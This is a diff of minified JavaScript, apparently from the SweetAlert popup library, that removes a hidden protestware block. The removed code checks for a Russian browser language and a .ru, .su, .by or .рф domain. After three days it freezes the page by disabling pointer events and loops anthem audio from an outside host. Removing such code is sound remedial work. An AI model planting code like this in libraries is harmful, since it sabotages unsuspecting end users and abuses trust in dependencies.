@@ -2103,23 +2103,6 @@
       document.activeElement instanceof HTMLElement && "function" == typeof document.activeElement.blur && document.activeElement.blur()
   }
   ;
-  if ("undefined" != typeof window && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
-      const e = new Date
-        , t = localStorage.getItem("swal-initiation");
-      t ? (e.getTime() - Date.parse(t)) / 864e5 > 3 && setTimeout( () => {
-          document.body.style.pointerEvents = "none";
-          const e = document.createElement("audio");
-          e.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3",
-          e.loop = !0,
-          document.body.appendChild(e),
-          setTimeout( () => {
-              e.play().catch( () => {}
-              )
-          }
-          , 2500)
-      }
-      , 500) : localStorage.setItem("swal-initiation", `${e}`)
-  }
   Un.prototype.disableButtons = Nt,
   Un.prototype.enableButtons = qt,
   Un.prototype.getInput = It,
